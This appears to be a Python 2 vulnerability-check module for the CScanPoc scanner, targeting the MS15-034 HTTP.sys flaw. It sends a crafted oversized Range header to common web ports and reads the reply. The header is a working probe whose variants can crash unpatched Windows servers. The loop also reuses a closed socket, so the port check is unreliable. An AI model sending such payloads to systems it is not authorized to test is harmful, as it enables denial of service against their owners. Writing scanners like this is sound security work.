# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import socket

class Vuln(ABVuln):
    vuln_id = 'MS15_034' # 平台漏洞编号
    name = 'HTTP.sys 远程代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-04-15'  # 漏洞公布时间
    desc = '''
        MS15-034 HTTP.sys 远程代码执行（CVE-2015-1635），但目前仅能作为DOS攻击。
    ''' # 漏洞描述
    ref = 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-034' # https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-034
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'CVE-2015-1635'  # cve编号
    product = 'Windows'  # 漏洞组件名称
    product_version = 'Windows 7、Windows Server 2008 R2、Windows 8 and Windows 8.1、Windows Server 2012 and Windows Server 2012 R2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3c6b7330-5012-4a6c-bd45-d2f2f631abef' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            arg = '{target}'.format(target=self.target)
            ports = ['80','8080','8081','3128','9080'] #常见的HTTP端口列表
            for port in ports:
                s.connect((arg, int(port)))
                flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
                s.send(flag)
                data = s.recv(1024)
                s.close()
                if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
                else:
                    continue
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()